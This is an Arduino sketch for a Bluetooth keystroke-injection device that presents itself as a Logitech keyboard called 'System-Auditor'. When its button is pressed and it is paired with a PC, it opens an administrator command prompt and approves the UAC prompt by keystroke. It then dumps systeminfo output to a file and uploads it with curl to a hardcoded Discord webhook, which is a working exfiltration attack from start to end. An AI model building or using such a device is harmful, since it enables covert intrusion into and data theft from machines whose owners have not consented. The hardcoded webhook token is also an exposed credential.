#include <BleKeyboard.h>
BleKeyboard bleKeyboard("System-Auditor", "Logitech", 100);

// CUSTOM FUNCTION: Manually presses and releases keys to sync with Asus TUF hardware
void typeSafe(String text) {
  for(int i=0; i < text.length(); i++) {
    bleKeyboard.press(text[i]);
    delay(40); // Key down
    bleKeyboard.releaseAll();
    delay(120); // Key up
  }
}

void setup() {
  pinMode(0, INPUT_PULLUP);
  bleKeyboard.begin();
}

void loop() {
  if (bleKeyboard.isConnected() && digitalRead(0) == LOW) {
    delay(2000); 

    // 1. Open Administrative CMD
    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.press('r'); delay(200); bleKeyboard.releaseAll();
    delay(1500);
    typeSafe("cmd");
    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press(KEY_LEFT_SHIFT); bleKeyboard.press(KEY_RETURN);
    delay(200); bleKeyboard.releaseAll();
    delay(3000); // Wait for UAC
    bleKeyboard.press(KEY_LEFT_ALT); bleKeyboard.press('y'); delay(200); bleKeyboard.releaseAll();
    delay(2000);

    // 2. Create the file with the CORRECT name
    // We use 'del' first to clean up the old 'lexit' file
    typeSafe("mkdir C:\\Klog");
    bleKeyboard.write(KEY_RETURN);
    delay(500);
    typeSafe("systeminfo > C:\\Klog\\log.txt");
    bleKeyboard.write(KEY_RETURN);
    delay(5000); // Give systeminfo time to finish 6KB

    // 3. Send the file to Discord
    // The delay(120) in typeSafe prevents the URL from mashing
    String url = "https://discord.com/api/webhooks/1466450537057615923/ZHjR5aI1VDQzpNcpK0eGjBuvs1V3juMT9xNVtFIe0U4VRboAH6JqjTFru0r-VYZPTY4w";
    typeSafe("curl -X POST -F \"file=@C:/Klog/log.txt\" " + url);
    bleKeyboard.write(KEY_RETURN);
    
    delay(4000); // Wait for upload
    typeSafe("exit");
    bleKeyboard.write(KEY_RETURN);

    while(digitalRead(0) == LOW) { delay(10); }
  }
}